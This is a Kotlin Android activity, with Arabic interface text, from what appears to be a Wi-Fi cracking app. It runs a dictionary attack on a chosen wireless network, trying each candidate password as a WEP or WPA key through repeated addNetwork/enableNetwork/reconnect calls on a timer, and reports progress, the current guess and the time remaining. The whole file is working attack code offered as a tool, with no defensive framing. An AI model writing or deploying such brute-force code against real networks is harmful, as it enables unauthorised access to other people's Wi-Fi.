package com.alialanbaki.wibrprored

import android.content.Context
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class MonitorActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var wifiManager: WifiManager

    private lateinit var tvTargetNetworkTitle: TextView
    private lateinit var pbLoadingSpinner: ProgressBar
    private lateinit var tvAttemptStatus: TextView
    private lateinit var tvNetDetails: TextView
    private lateinit var tvSignalStrength: TextView
    private lateinit var tvCurrentCandidate: TextView
    private lateinit var tvCounterRatio: TextView
    private lateinit var pbFinishTimeline: ProgressBar
    private lateinit var tvFinishEstimate: TextView
    private lateinit var tvMonitorDelayLabel: TextView
    private lateinit var btnTogglePause: Button

    private var passwords: List<String> = emptyList()
    private var currentIndex = 0
    private var isPaused = false
    private var isFinished = false

    private val attemptRunnable = object : Runnable {
        override fun run() {
            if (isPaused || isFinished) return

            val total = passwords.size
            if (currentIndex >= total) {
                isFinished = true
                pbLoadingSpinner.isIndeterminate = false
                pbLoadingSpinner.progress = 100
                tvAttemptStatus.text = "انتهت جميع محاولات القاموس ($total من أصل $total)"
                tvCounterRatio.text = "$total رمز من أصل $total"
                pbFinishTimeline.progress = pbFinishTimeline.max
                tvFinishEstimate.text = "الوقت المتبقي للانتهاء: 00:00 (اكتمل)"
                btnTogglePause.isEnabled = false
                return
            }

            val candidate = passwords[currentIndex]
            val attemptNumber = currentIndex + 1

            tvCurrentCandidate.text = "الباسورد الجاري تجربته: $candidate"
            tvCounterRatio.text = "$attemptNumber رمز من أصل $total"
            pbFinishTimeline.progress = attemptNumber

            val target = AppSession.selectedTarget
            if (target != null) {
                triggerWifiConnectionAttempt(target, candidate)
                tvAttemptStatus.text = "جاري محاولة الربط على (${target.ssid}) بالرمز: $candidate"
            }

            updateRemainingTimeEstimate(remainingItems = total - attemptNumber)

            currentIndex++
            val waitMs = AppSession.delaySeconds.coerceAtLeast(1) * 1000L
            handler.postDelayed(this, waitMs)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_monitor)

        wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        tvTargetNetworkTitle = findViewById(R.id.tvTargetNetworkTitle)
        pbLoadingSpinner = findViewById(R.id.pbLoadingSpinner)
        tvAttemptStatus = findViewById(R.id.tvAttemptStatus)
        tvNetDetails = findViewById(R.id.tvNetDetails)
        tvSignalStrength = findViewById(R.id.tvSignalStrength)
        tvCurrentCandidate = findViewById(R.id.tvCurrentCandidate)
        tvCounterRatio = findViewById(R.id.tvCounterRatio)
        pbFinishTimeline = findViewById(R.id.pbFinishTimeline)
        tvFinishEstimate = findViewById(R.id.tvFinishEstimate)
        tvMonitorDelayLabel = findViewById(R.id.tvMonitorDelayLabel)
        btnTogglePause = findViewById(R.id.btnTogglePause)

        val target = AppSession.selectedTarget
        passwords = AppSession.activePasswords

        val ssidText = target?.ssid ?: "شبكة غير محددة"
        tvTargetNetworkTitle.text = "الشبكة: $ssidText"
        tvNetDetails.text = "BSSID: ${target?.bssid ?: "-"} | التشفير: ${target?.capabilities ?: "-"}"
        tvSignalStrength.text = "قوة الشبكة: ${target?.signalPercent ?: 0}%"

        pbFinishTimeline.max = passwords.size.coerceAtLeast(1)
        pbFinishTimeline.progress = 0

        findViewById<Button>(R.id.btnMonitorDelayMinus).setOnClickListener {
            if (AppSession.delaySeconds > 1) {
                AppSession.delaySeconds -= 1
                rescheduleDelay()
            }
        }

        findViewById<Button>(R.id.btnMonitorDelayPlus).setOnClickListener {
            if (AppSession.delaySeconds < 60) {
                AppSession.delaySeconds += 1
                rescheduleDelay()
            }
        }

        btnTogglePause.setOnClickListener {
            if (isFinished) return@setOnClickListener
            if (!isPaused) {
                isPaused = true
                handler.removeCallbacks(attemptRunnable)
                tvAttemptStatus.text = "الفحص متوقف مؤقتاً"
                btnTogglePause.text = "استئناف"
            } else {
                isPaused = false
                tvAttemptStatus.text = "تم استئناف محاولات الربط..."
                btnTogglePause.text = "إيقاف مؤقت"
                handler.post(attemptRunnable)
            }
        }

        updateDelayText()
        updateRemainingTimeEstimate(remainingItems = passwords.size)
        handler.post(attemptRunnable)
    }

    private fun triggerWifiConnectionAttempt(target: WifiTarget, password: String) {
        if (!wifiManager.isWifiEnabled) return
        try {
            @Suppress("DEPRECATION")
            val config = WifiConfiguration().apply {
                SSID = "\"${target.ssid}\""
                BSSID = target.bssid
                if (target.capabilities.uppercase().contains("WEP")) {
                    wepKeys[0] = "\"$password\""
                    wepTxKeyIndex = 0
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                    allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40)
                    allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104)
                } else if (target.capabilities.uppercase().contains("WPA") ||
                    target.capabilities.uppercase().contains("PSK")
                ) {
                    preSharedKey = "\"$password\""
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                } else {
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                }
            }

            @Suppress("DEPRECATION")
            val netId = wifiManager.addNetwork(config)
            if (netId != -1) {
                @Suppress("DEPRECATION")
                wifiManager.disconnect()
                @Suppress("DEPRECATION")
                wifiManager.enableNetwork(netId, true)
                @Suppress("DEPRECATION")
                wifiManager.reconnect()
            }
        } catch (_: Exception) {
        }
    }

    private fun rescheduleDelay() {
        updateDelayText()
        val remaining = (passwords.size - currentIndex).coerceAtLeast(0)
        updateRemainingTimeEstimate(remainingItems = remaining)
        if (!isPaused && !isFinished) {
            handler.removeCallbacks(attemptRunnable)
            handler.postDelayed(attemptRunnable, AppSession.delaySeconds * 1000L)
        }
    }

    private fun updateDelayText() {
        val s = AppSession.delaySeconds
        tvMonitorDelayLabel.text = "سرعة الربط: $s ${if (s == 1) "ثانية" else "ثواني"}"
    }

    private fun updateRemainingTimeEstimate(remainingItems: Int) {
        val totalSeconds = remainingItems.coerceAtLeast(0) * AppSession.delaySeconds.coerceAtLeast(1)
        val hours = totalSeconds / 3600
        val minutes = (totalSeconds % 3600) / 60
        val seconds = totalSeconds % 60
        tvFinishEstimate.text = if (hours > 0) {
            String.format("الوقت المتبقي للانتهاء: %02d:%02d:%02d", hours, minutes, seconds)
        } else {
            String.format("الوقت المتبقي للانتهاء: %02d:%02d", minutes, seconds)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(attemptRunnable)
    }
}
